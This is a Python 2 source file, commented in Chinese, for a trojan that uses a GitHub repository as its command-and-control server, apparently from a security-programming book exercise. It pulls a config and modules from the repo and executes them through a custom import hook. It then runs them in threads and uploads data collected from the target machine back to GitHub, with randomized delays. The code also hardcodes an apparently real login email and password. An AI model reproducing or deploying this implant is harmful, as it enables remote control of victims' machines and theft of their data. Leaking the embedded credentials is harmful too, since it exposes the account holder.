#!/usr/bin/env python
# coding=utf-8

import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

#特洛伊id
trojan_id = 'abc'

trojan_config = '%s.json' % trojan_id
data_path = 'data/%s/' % trojan_id
trojan_modules = []
configured = False
task_queue = Queue.Queue()


#认证用户 连接github
def connect_to_github():
    #获取用户
    gh = login(username='859009360@qq.com',password='sedate1119..')
    #获取项目
    repo = gh.repository('Sedateman','chapter7')
    #获取分支
    branch = repo.branch('master')
    return gh,repo,branch

#获取文件内容
def get_file_contents(filepath):
    gh,repo,branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    #遍历目录
    for filename in tree.tree:
        #如果存在所需 打印 return blob形式文件内容
        if filepath in filename.path:
            print '[*] Found file %s' % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None

#获取特洛伊配置
def get_trojan_config():
    global configured
    #传递参数json文件name 调用上一个方法获取json配置文件内容
    config_json = get_file_contents(trojan_config)
    #解码读取内容
    config = json.loads(base64.b64decode(config_json))
    configured = True

    #遍历json配置内容
    for task in config:
        #在内存中查找是否import了配置中的模块
        #如果没有 执行import
        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])

    return config

#将从目标机上收集的数据推送到repo中
def store_module_result(data):
    gh,repo,branch = connect_to_github()
    #设置数据保存路径
    remote_path = 'data/%s/%d.data' % (trojan_id,random.randint(1000,100000))
    #创建文件
    repo.create_file(remote_path,'Commit message',base64.b64encode(data))
    return 


class GitImporter:
    def __init__(self):
        self.current_module_code = ''

    def find_module(self,fullname,path=None):
        if configured:
            print '[*] Attempting to retrieve %s' % fullname
            new_library = get_file_contents('modules/%s' % fullname)

            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self,name):
        #创建空的模块对象
        module = imp.new_module(name)
        #将模块代码导入这个对象中
        exec self.current_module_code in module.__dict__
        #将新建的模块添加到sys.modules列表里 之后就可以import这个模块了
        sys.modules[name] = module
        return module

def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    #保存结果到我们的repo中
    store_module_result(result)

    return 

#当执行import相关操作时 会触发meta_path列表中对象
sys.meta_path = [GitImporter()]
#木马主循环
while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner,args=(task['module'],))
            t.start()
            time.sleep(random.randint(1,10))

    time.sleep(random.randint(1000,10000))
